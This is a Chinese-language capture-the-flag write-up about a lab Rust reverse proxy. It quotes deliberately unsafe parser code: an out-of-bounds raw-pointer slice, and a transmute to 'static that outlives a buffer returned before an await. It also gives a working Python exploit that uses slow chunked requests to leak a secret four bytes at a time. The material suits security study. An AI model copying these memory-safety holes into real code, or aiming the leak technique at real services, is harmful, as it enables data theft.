# 工程架构

Gateway 是外部入口，Vault 只监听容器内的 `127.0.0.1:3005`，外部网络请求到不了 vault。Vault 是一个 Axum HTTP 服务，关键内部接口是：

```
GET /internal/compliance/export-snapshot
```

调用它返回的是一份模拟的每日现金头寸对账报告。源码实际返回的是无空白的 minified JSON，使用默认 token 时长度为 451 字节。Token 藏在 `reconciliation_token` 字段里，起始偏移为 402，位置在 JSON 的最末尾；下面为了可读性格式化展示：

```json
{
  "portfolio": "northwind-capital",
  "report": "daily-cash-reconciliation",
  "generated_at": "2026-06-02T09:30:00+08:00",
  "positions": [
    { "desk": "treasury-ops", "currency": "USD", "notional": 18420000 },
    { "desk": "fx-liquidity", "currency": "EUR", "notional": 7200000 },
    { "desk": "settlement", "currency": "JPY", "notional": 930000000 }
  ],
  "controls": {
    "source": "custody-ledger",
    "approval": "two-person-review"
  },
  "reconciliation_token": "SCTF{...}"
}
```

服务本身没有鉴权，但不对外监听。所以无法直接请求这个接口。

Gateway 是基于 Hyper 的反向代理，监听 `0.0.0.0:8080`。主要有三个功能：

**反向代理**

网关把匹配路由的请求转发到对应的后端服务（包括 vault）。路由表配置在 `gateway.toml` 里，`/api` 前缀的请求会被代理到 `http://127.0.0.1:3005`，例如 `/api/status` 可以正常到达 vault。但 gateway 转发时不会剥离 `/api` 前缀，所以请求 `/api/internal/compliance/export-snapshot` 会被转发为 vault 上不存在的 `/api/internal/compliance/export-snapshot`，无法直接拿到内部导出报告。

**后台 Refresh 任务**

Gateway 启动时会 spawn 一个后台 tokio 任务，每隔 1 秒请求一次 vault 的 `/internal/compliance/export-snapshot`。拿到响应后，把 body 写入 scratch buffer 池里所有已归还的 buffer 中。这就是敏感数据进入 gateway 进程内存的方式。

后台任务的入口在 `SelectorEngine::new`：

```rust
// gateway/src/selector.rs
if let Some(url) = snapshot_url {
    let engine = engine.clone();
    tokio::spawn(async move {
        loop {
            if let Ok(body) = fetch_http_body(&url).await {
                engine.store_snapshot(&body);
            }
            sleep(refresh_interval).await;
        }
    });
}
```

`store_snapshot` 遍历每个 tenant pool 里的所有 buffer，先清零再拷入报告内容：

```rust
fn store_snapshot(&self, body: &[u8]) {
    let snapshot = body[..body.len().min(SCRATCH_CAP)].to_vec();
    let mut pools = self.pools.lock().expect("selector pool lock poisoned");
    for pool in pools.values_mut() {
        for scratch in pool.iter_mut() {
            scratch.fill(0);
            scratch[..snapshot.len()].copy_from_slice(&snapshot);
        }
    }
}
```

注意这里的逻辑：如果某个 buffer 已经被 checkout 出去了（正在被请求使用中），它就不在 pool 里，也就不会被覆盖。只有已经归还的 buffer 才会被 refresh 写入。

**路由审计接口**

```
POST /__route/audit
```

这是外部唯一能直接调用的调试入口。请求需要带 `X-Route-Selector` header。Body 内容本身不参与解析，但 gateway 会等待 body 结束后才返回审计结果，因此 body 的结束时机很重要。网关解析 header 里的路由选择器，返回一个 JSON：

```json
{ "tenant": "...", "path": "...", "nonce_preview_hex": "..." }
```

`nonce_preview_hex` 是解析出来的 nonce 字段的十六进制表示。漏洞就是在这里，它可能包含 header 之外的内存内容。

# unsafe 零拷贝解析器的越界读取

网关为了避免每次请求都分配新内存，使用了一个复用的 scratch buffer 池。池子的结构是：

```rust
const SCRATCH_CAP: usize = 512;
type Scratch = Box<[u8; SCRATCH_CAP]>;
type TenantPools = HashMap<String, Vec<Scratch>>;
```

按 tenant（选择器里第一个冒号前面的部分）分片，每个 tenant 有一个 `Vec<Scratch>` 池。请求来时 checkout 一个 512 字节的 buffer，用完 checkin 归还。如果池子是空的，就 `Box::new([0_u8; 512])` 分配一个新的。

每次 checkout 时会 `scratch.fill(0)` 清零，所以正常情况下不存在跨请求的数据残留——如果你老老实实在 buffer 的生命周期内使用它的话。

`X-Route-Selector` header 的预期格式是三段，用冒号分隔：

```
tenant:path:nonce
```

比如：`northwind-capital:/ops/route-diagnostics:a1b2c3d4`

解析器把这三段切出来：tenant 是第一个冒号之前的部分，path 是两段冒号之间的部分，nonce 是第二个冒号之后的部分。解析结果中的 tenant 还被用作 pool 的分片键。

解析函数的核心逻辑在 `gateway/src/selector.rs:129-160`：

```rust
unsafe fn parse_route_selector(raw: &[u8], scratch_cap: usize) -> ParsedSelector<'_> {
    // 找第一个冒号
    let first = memchr::memchr(b':', raw).unwrap_or(raw.len());

    // 找第二个冒号（从第一个冒号后一个字节开始找）
    let second = if first < raw.len() {
        memchr::memchr(b':', &raw[first + 1..])
            .map(|index| index + first + 1)
            .unwrap_or(raw.len())  // 没找到第二个冒号时，second = raw.len()
    } else {
        raw.len()
    };

    // 计算 nonce 的起始位置
    let tenant_end = first.min(raw.len());
    let path_start = first.saturating_add(1).min(raw.len());
    let path_end = second.min(raw.len());
    let nonce_start = second.saturating_add(1);
    //                                     ↑ 当 second == raw.len() 时，
    //                                     nonce_start = raw.len() + 1，已越界

    // 计算 nonce 长度
    let nonce_len = scratch_cap.saturating_sub(nonce_start).min(NONCE_PREVIEW_BYTES);
    //             ^^^^^^^^^^  用的是 scratch buffer 的总容量 512 来计算

    // 构造 slice
    let tenant = unsafe { std::str::from_utf8_unchecked(&raw[..tenant_end]) };
    let path = unsafe { std::str::from_utf8_unchecked(&raw[path_start..path_end]) };
    let nonce = if nonce_len == 0 {
        &[]
    } else {
        unsafe { std::slice::from_raw_parts(raw.as_ptr().add(nonce_start), nonce_len) }
    };
    //                                         ↑ 裸指针加偏移，不受 slice 边界检查保护
    //                                         当 nonce_start > raw.len() 时越界读取

    ParsedSelector { tenant, path, nonce }
}
```

正常情况：header 是 `northwind-capital:/ops/route-diagnostics:a1b2c3d4`

- `first = 17`（第一个 `:` 的位置）
- `second = 40`（第二个 `:` 的位置，也就是 nonce 前面的冒号）
- `nonce_start = 41`，还在 `raw` 里面（`raw.len()` 是 49）
- `nonce_len = 512 - 41 = 471`，但被 `.min(4)` 限制为 4
- nonce 读到的是 `a1b2c3d4` 的前 4 字节

异常情况：header 只有一个冒号，比如 `northwind-capital:/ops/route-diagnostics`

- `first = 17`
- 从位置 18 往后的内容里没有第二个冒号，`memchr` 返回 `None`，所以 `second = raw.len()` = 40
- `nonce_start = 40 + 1 = 41`，已经超过了 header 的实际长度 40
- 但 `nonce_len = 512 - 41 = 471`，被 `.min(4)` 限制为 4
- `nonce` 变成了从 `raw.as_ptr() + 41` 开始的 4 字节 slice，跑到了 header 后面

```
Scratch Buffer（512 字节）
┌──────────────────────────────────────────────────────────────────────────────┐
│ northwind-capital:/ops/route-diagnostics │ 00 00 00 00 00 00 00 ...          │
│ ← ← ← ← ← header 大约 40 字节 → → → → →│ ← ← nonce slice 指向这里 → →       │
└──────────────────────────────────────────────────────────────────────────────┘
                                           ↑
                                     nonce_start = 41
                                     raw 逻辑上只有 40 字节长
                                     但裸指针加偏移不受这个限制
```

这里不是随机读到任意内存。因为 header 被拷进了 512 字节的 scratch buffer，越界 slice 指向的仍然是这块 buffer 内的后续位置。解析阶段只是构造出这个 slice。真正把 slice 编码成 `nonce_preview_hex` 发生在后面的 `finish()`，所以只要中途 refresh 任务把合规导出报告写入同一块 buffer，这个 slice 就会读到报告内容。

# Transmute 与跨 Await 借用

光有越界读还不够，因为每次 checkout 都会 `scratch.fill(0)` 清零，正常流程下 header 后面全是零。要让越界读读到有意义的数据，需要配合 async 生命周期错误漏洞。

`defer_trace` 的核心流程在 `gateway/src/selector.rs:67-87`：

```rust
pub fn defer_trace(&self, raw_header: &[u8]) -> DeferredTrace {
    let tenant_key = tenant_key(raw_header);

    // 从池里取出一个 buffer，清零，拷入 header
    let mut scratch = self.checkout(&tenant_key);
    let raw_len = raw_header.len().min(SCRATCH_CAP);
    scratch[..raw_len].copy_from_slice(&raw_header[..raw_len]);

    // 在 buffer 上做零拷贝解析
    let (tenant, path, nonce) = {
        let raw = &scratch[..raw_len];
        let parsed = unsafe { parse_route_selector(raw, SCRATCH_CAP) };

        // 把 nonce slice 的 lifetime 从 &'_ [u8] 提升为 &'static [u8]
        let nonce = unsafe {
            std::mem::transmute::<&[u8], &'static [u8]>(parsed.nonce)
        };

        // tenant 和 path 拷成 owned String，nonce 保留为 &'static 引用
        (parsed.tenant.to_string(), parsed.path.to_string(), nonce)
    };

    // 提前归还 buffer
    self.checkin(tenant_key, scratch);

    // 返回的 DeferredTrace 里 hold 着一个指向已归还 buffer 的 'static 引用
    DeferredTrace { tenant, path, nonce }
}
```

再看调用方 `route_audit`（`gateway/src/gateway.rs:126-148`）：

```rust
async fn route_audit(&self, request: Request<Incoming>) -> Result<Response<ResponseBody>, BoxedError> {
    let Some(selector) = request.headers().get("x-route-selector") else {
        /* 400 */
    };

    // 解析 selector，buffer 在这里面被归还了
    let trace = self.selector.defer_trace(selector.as_bytes());

    // 这里有一个 .await，buffer 已经还回去了
    // 但 trace 里的 nonce 还指着它
    // 如果后台 refresh 在这期间跑了，buffer 内容就变了
    request.into_body().collect().await?;

    // 现在才去读 nonce，此时 buffer 可能已经被 refresh 覆盖了
    let trace = trace.finish();
    /* 返回 nonce_preview_hex */
}
```

`.await` 会让出执行权，tokio 调度器可能在这期间运行 refresh 任务。由于 refresh 是每秒一次，只要让 `.await` 的持续时间跨越一次 refresh，就能稳定触发。

可以用 HTTP chunked transfer encoding 来控制这个时间窗口：先发 headers，但暂不发送结束块，让服务端在 `.await` 那里等着，过 1 秒以上（确保至少跑了一次 refresh）再结束 body。

普通请求（不带慢 body）也会归还 buffer 再 `.await`，但 body 太小，`collect().await` 几乎瞬间完成，通常不会跨过下一次 refresh，因此读到的多半是 checkout 清零后的空洞。即使极偶然跨过 refresh，也只能得到当前 padding 对应位置的 4 字节窗口，不能靠一次请求拼出完整 token。

# 利用

两个约束决定了利用方式：

1. **每次只能得到 4 字节**。审计接口只返回短 nonce preview，`NONCE_PREVIEW_BYTES` 固定为 4，`nonce_len` 被 `.min(4)` 截断。一次请求最多拿 4 字节有用数据。
2. **合规导出 JSON 长度为 451 字节，token 在末尾**。默认 token 的起始偏移是 402。如果 `nonce_start` 落在 buffer 的前部（比如位置 51），读到的 4 字节是 JSON 开头附近的内容，离 token 还差 300 多字节。

控制 `nonce_start` 的方法很简单。回顾一下：当 header 只有一个冒号时，`second = raw.len()`，所以：

```
nonce_start = second + 1 = raw.len() + 1 = 整个 header 的长度 + 1
```

也就是说，nonce_start 完全由 header 的长度控制。增加 header 的长度，nonce_start 就跟着往后移，4 字节的泄漏窗口也跟着滑动。

Exploit 用一个前缀加可变长度填充的方式来构造不同长度的 header：

```
前缀：northwind-capital-<random>:/ops/route-diagnostics/
     ↑ 50 字节

添加 0 个 A → header 长度 = 50 → nonce_start = 51
添加 1 个 A → header 长度 = 51 → nonce_start = 52
添加 2 个 A → header 长度 = 52 → nonce_start = 53
...
添加 351 个 A → header 长度 = 401 → nonce_start = 402
```

每次 `nonce_start` 往后移 1 字节，4 字节泄漏窗口也跟着移 1 字节。相邻两个窗口有 3 字节重叠。

```
Scratch Buffer（512 字节）
┌──────────────────────────────────────────────────────────────────────────────┐
│ 合规导出 JSON（451 字节）                                                     │
│ ┌─── portfolio, positions 等内容 ───┬──── reconciliation_token ────┬── 剩余 ─┐│
│                                     │    SCTF{...}                  │         ││
└──────────────────────────────────────────────────────────────────────────────┘
                                      ↑
                                 4 字节窗口需要滑过这里

pad_len = 0:    [4B]   从 offset 51 开始，还没到 token 区域
pad_len = 150:            [4B]   还在 positions / controls 附近
...
pad_len = 351:                                        [4B][4B][4B]...
                                                              ↑ 拼出来
```

每轮请求拿到 4 字节的 nonce。相邻两个 padding 长度差 1，所以相邻窗口有 3 字节重叠。拼接方式是取每个 chunk 的第 1 个字节，最后再补上最后一个 chunk 的后 3 字节：

```
chunk[0]: [a0 a1 a2 a3]
chunk[1]:    [b1 b2 b3 b4]    ← offset 差 1，所以 b1 在 a0 的下一个位置
chunk[2]:       [c2 c3 c4 c5]
...

拼接结果: a0 b1 c2 d3 e4 f5 ...
          ↑  ↑  ↑  每个 chunk 取首字节
                    最后补上最后一个 chunk 的 [1:4]
```

这样就从 scratch buffer 的第 51 字节开始重建出一段连续的内存内容，用正则 `SCTF\{[^}]+\}` 搜索就能匹配到 token。

**Exploit 解释**

```python
import json
import os
import re
import socket
import time
from urllib.parse import urlparse

BASE = "http://127.0.0.1:8080"
URL = urlparse(BASE)
HOST = URL.hostname or "127.0.0.1"
PORT = URL.port or 80
TENANT = "northwind-capital-" + os.urandom(4).hex()
PREFIX = TENANT + ":/ops/route-diagnostics/"
SCAN = 430
BATCH = 16
HOLD = 1.3
```

慢 body 请求：

```python
def open_leak(selector):
    s = socket.create_connection((HOST, PORT), timeout=5)
    req = (
        "POST /__route/audit HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"X-Route-Selector: {selector}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    s.sendall(req.encode())
    return s
```

用原生 socket 发 HTTP 请求，声明 `Transfer-Encoding: chunked` 但不立即发送终止块 `0\r\n\r\n`。服务端收到 headers 后开始处理——解析 selector、归还 buffer、进入 `.await` 等 body——然后就卡住了。socket 保持打开，数据还没发完。

触发 refresh 并收数据：

```python
def finish_leak(s):
    s.sendall(b"0\r\n\r\n")    # 结束 chunked body
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()
    body = data.split(b"\r\n\r\n", 1)[1]
    return bytes.fromhex(json.loads(body)["nonce_preview_hex"])
```

发送 `0\r\n\r\n` 告诉服务端 body 结束了，`collect().await` 返回，gateway 接着执行 `trace.finish()`，读 nonce slice（此时已经是被 refresh 覆盖过的内容），返回给客户端。客户端解析 JSON，把 `nonce_preview_hex` 解码成原始 4 字节。

主循环：

```python
chunks = []
for start in range(0, SCAN, BATCH):
    # 批量打开连接，发 headers 但不结束 body
    sockets = [
        open_leak(PREFIX + ("A" * pad_len))
        for pad_len in range(start, min(start + BATCH, SCAN))
    ]

    # 等 1.3 秒，让 refresh 跑一轮
    time.sleep(HOLD)

    # 结束 body，收响应
    chunks += [finish_leak(s) for s in sockets]
```

每批 16 个并发连接，这样 430 个偏移位置大约需要 27 批。批量比逐个快的多，而且一批内的请求会在同一次 refresh 周期中拿到数据，一致性更好。

拼接与搜索：

```python
stitched = bytearray()
for chunk in chunks:
    stitched += chunk[:1]      # 每个 chunk 拿第一个字节
stitched += chunks[-1][1:]     # 补上最后一个 chunk 的后三字节

marker = re.search(rb"SCTF\{[^}]+\}", stitched)
if marker:
    print(marker.group().decode())
```

因为相邻 padding 长度差 1，4 字节窗口每次滑 1 字节。以下 offset 是相对扫描起点的偏移；在当前 `solve.py` 里，扫描起点对应 scratch buffer 的绝对 offset 51：

- `chunk[0]` 覆盖相对 offset `0..4`，也就是 scratch offset `51..55`
- `chunk[1]` 覆盖相对 offset `1..5`，也就是 scratch offset `52..56`
- `chunk[2]` 覆盖相对 offset `2..6`，也就是 scratch offset `53..57`

每个 chunk 的第 0 字节（`chunk[:1]`）是新的那个字节，最后补上 `chunks[-1][1:]` 拿到末尾 3 个还没覆盖的位置。拼出来的结果长度是 `SCAN + NONCE_PREVIEW_BYTES - 1 = 433` 字节，覆盖 scratch buffer 的 offset `51..484`。
